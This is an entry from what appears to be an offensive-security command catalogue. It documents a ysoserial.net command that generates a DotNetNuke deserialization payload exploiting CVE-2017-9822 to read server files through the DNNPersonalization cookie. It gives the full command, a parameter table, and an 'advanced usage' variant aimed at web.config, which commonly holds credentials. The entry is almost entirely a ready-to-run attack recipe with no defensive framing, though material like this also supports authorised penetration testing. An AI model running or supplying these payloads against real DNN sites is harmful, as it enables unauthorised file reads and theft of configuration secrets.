---
id: cmd-002
data: >-
  PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m
  read_file -f C:\Windows\win.ini
tags:
  - deserialization
  - file-read
type: command
output: XML payload string for insertion into DNNPersonalization cookie
executor: powershell
platforms:
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.711Z'
verified: false
validated: true
submitted: true
---
# ysoserial-dotnetnuke-read-file

## Command

```powershell
PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini
```

## Description

Generates a deserialization payload for DNN to read the contents of a specified file via cookie manipulation in CVE-2017-9822.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-p` | Plugin: DotNetNuke | Yes |
| `-m` | Mode: read_file | Yes |
| `-f` | File path to read, e.g., C:\Windows\win.ini | Yes |

## Examples

### Basic Usage

```powershell
ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini
```

### Advanced Usage

Change file: ```powershell
ysoserial.exe -p DotNetNuke -m read_file -f C:\inetpub\wwwroot\web.config
```

## Expected Output

XML payload string for insertion into DNNPersonalization cookie.

## Related

- [[commands/ysoserial-dotnetnuke-help]]
- [[procedures/Trigger-DNN-Cookie-Deserialization-for-File-Read]]
